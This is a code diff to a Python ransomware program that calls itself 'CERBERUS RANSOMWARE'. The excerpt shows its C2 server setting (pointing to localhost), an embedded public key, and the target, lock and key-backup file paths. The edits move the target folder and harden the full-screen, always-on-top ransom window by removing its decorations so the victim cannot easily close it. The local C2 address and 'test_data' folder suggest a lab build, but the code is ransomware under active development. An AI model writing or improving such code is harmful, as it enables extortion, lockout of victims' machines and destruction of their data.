@@ -23,7 +23,7 @@ FQIDAQAB
 -----END PUBLIC KEY-----"""
 
 C2_SERVER_URL = "http://127.0.0.1:5000" # Change if your C2 is hosted elsewhere
-TARGET_DIRECTORY = os.path.join(os.path.expanduser("~"), "test_data")
+TARGET_DIRECTORY = os.path.join(os.path.expanduser("."), "test_data")
 LOCK_FILE = os.path.join(TARGET_DIRECTORY, ".cerberus_lock")
 ID_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_id.txt") # PERSISTENCE: Store ID here
 KEY_BACKUP_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_key.bak") # SAFETY: Backup key before check-in
@@ -207,7 +207,10 @@ class RansomwareGUI:
 
         # Kiosk Mode Settings (Linux Optimized)
         master.title("CERBERUS RANSOMWARE")
-        master.attributes('-fullscreen', True)
+        # On Linux, 'zoomed' state or 'attributes -fullscreen' works. 
+        # But 'overrideredirect' is key to removing window decorations (title bar, borders).
+        master.attributes('-fullscreen', True) 
+        master.overrideredirect(True) # Ensure no window decorations
         master.attributes('-topmost', True)
         master.configure(bg='#0a0a0a')
         master.resizable(False, False)
@@ -327,8 +330,8 @@ class RansomwareGUI:
             
             # Allow closing
             self.master.grab_release() # Release input grab
-            self.master.protocol("WM_DELETE_WINDOW", self.master.destroy)
-            self.master.bind('<Escape>', lambda e: self.master.destroy())
+            self.master.destroy() # Force destroy without waiting for protocols
+            sys.exit() # Ensure script terminates fully
             
         except Exception as e:
             log_error(f"Decryption failed: {e}")
